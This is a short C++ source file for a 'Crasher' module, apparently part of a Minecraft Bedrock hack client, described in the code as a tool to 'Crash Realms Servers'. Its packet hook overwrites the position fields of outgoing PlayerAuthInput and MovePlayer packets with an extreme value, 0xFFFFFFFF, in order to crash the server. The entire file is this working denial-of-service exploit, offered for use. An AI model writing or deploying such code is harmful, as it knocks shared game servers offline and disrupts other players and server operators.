#include "Crasher.h"

Crasher::Crasher() : IModule(0, Category::MISC, "Crash Realms Servers") {
}

Crasher::~Crasher() {
}

const char* Crasher::getModuleName() {
	return ("Crasher");
}

void Crasher::onEnable() {
	if (g_Data.getLocalPlayer() == nullptr)
		setEnabled(false);
}

void Crasher::onTick(C_GameMode* gm) {
	if (g_Data.getLocalPlayer() == nullptr)
		setEnabled(false);
}

void Crasher::onSendPacket(C_Packet* packet) {
	if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
		PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
		InputPacket->pos.x = static_cast<float>(0xFFFFFFFF);
		InputPacket->pos.y = static_cast<float>(0xFFFFFFFF);
		InputPacket->pos.z = static_cast<float>(0xFFFFFFFF);
	} else if (packet->isInstanceOf<C_MovePlayerPacket>()) {
		C_MovePlayerPacket* movePacket = reinterpret_cast<C_MovePlayerPacket*>(packet);
		movePacket->Position.x = static_cast<float>(0xFFFFFFFF);
		movePacket->Position.y = static_cast<float>(0xFFFFFFFF);
		movePacket->Position.z = static_cast<float>(0xFFFFFFFF);
	}
}
